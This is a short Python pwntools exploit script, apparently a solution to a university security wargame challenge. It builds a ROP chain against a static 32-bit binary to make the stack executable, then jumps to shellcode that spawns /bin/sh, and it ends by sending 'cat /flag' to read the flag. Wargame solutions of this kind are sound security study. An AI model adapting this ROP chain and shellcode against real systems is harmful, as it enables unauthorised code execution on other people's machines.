#!/usr/bin/python

from pwn import *

#c = process("./binaries/static")
c = remote("wargames.6447.sec.edu.au", 8004)
#c = gdb.debug("./binaries/static")

shellcode = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

offset = 12
prot_func = 0x0809ac20	# function address of make_stack_executable
stack_prot = 0x080e9fec	# global variable of the stack permission
stack_end = 0x080e9fc4	# global variable of libc_stack_end
pop_edx = 0x0806eada	# pop edx ; ret
pop_ecx = 0x080c12f4	# pop ecx ; ret
pop_eax = 0x080bb236	# pop eax ; ret
pop_3 = 0x0806eb00		# pop edx ; pop ecx ; pop ebx ; ret
init_value = 0xffffffff	# value -1 to start incrementing with, avoid any null bytes
add_to_edx = 0x080da8ce	# add dword ptr [edx], ecx ; ret
mov_to_edx = 0x08054b72 # mov dword ptr [edx], ecx ; ret
inc_ecx = 0x080da54c	# inc ecx ; ret
inc_eax = 0x0807b52f	# inc eax ; ret
call_esp = 0x08089700	# call esp
mov_edx_eax = 0x0809a54d	# mov dword ptr [edx], eax ; ret
add_esp = 0x0806b869

payload = "a"*offset
payload += p32(pop_edx)
payload += p32(stack_prot)
payload += p32(pop_eax)
payload += p32(init_value)
for i in range(8):	# add 8 to ecx
	payload += p32(inc_eax)

payload += p32(mov_edx_eax)
payload += p32(pop_eax)
payload += p32(stack_end)
payload += p32(prot_func)
for i in range(150):
	payload += p32(add_esp)

payload += p32(call_esp)
payload += shellcode
c.sendline(payload)
c.sendline("cat /flag")
c.recvline()
flag = c.recvline()
log.success("Flag: %s" % (flag))
#print payload
c.close()
